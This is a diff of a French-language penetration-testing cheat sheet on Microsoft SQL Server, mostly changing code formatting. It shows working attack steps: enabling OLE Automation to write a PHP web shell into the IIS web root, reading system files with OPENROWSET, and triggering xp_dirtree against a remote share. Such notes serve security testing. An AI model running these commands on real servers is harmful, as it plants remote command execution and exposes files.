@@ -70,7 +70,7 @@ SELECT * FROM sys.servers;
 Si un serveur lié (Linked Server) est découvert, on pourra tenter d'y accéder, vérifier si nous disposons de privilèges différents sur celui-ci. Voir la partie `Exploitation` plus bas sur cette page.
 
 ##### Exploration de l'instance de base de donnée
-```
+```sql
 -- Get databases
 select name from sys.databases;
 SELECT name FROM master.dbo.sysdatabases;
@@ -88,7 +88,7 @@ SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
 
 Utilitaire installer avec SQLServer
 Il faudra ajouter le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
-```
+```shell
 # -y 30 -Y 30 augmentent la visibilité des résultat (attention aux performances)
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 
@@ -100,7 +100,7 @@ sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 Equivalent de sqlcmd sous Windows, pour Linux.
 Comme sous windows, on ajoutera le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
 
-```
+```she
 # Authentificatino Interne (SQL Server)
 sqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD
 
@@ -156,35 +156,31 @@ EXEC master..xp_dirtree '\\10.10.110.17\share\'
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
 ```
 
-
 #### Ecriture dans un fichier
 ```
 ------------------------------------------------------------------------
 -- Creation de fichier via OLE Automation Procedures
+
 -- Activation
-1> sp_configure 'show advanced options', 1
-2> GO
-3> RECONFIGURE
-4> GO
-5> sp_configure 'Ole Automation Procedures', 1
-6> GO
-7> RECONFIGURE
-8> GO
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+
 -- Création de fichier
-1> DECLARE @OLE INT
-2> DECLARE @FileID INT
-3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
-4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-6> EXECUTE sp_OADestroy @FileID
-7> EXECUTE sp_OADestroy @OLE
-8> GO
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
 ```
 
 #### Lecture d'un fichier
+
 ```
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-2> GO
 ```
 
 #### Création de compte
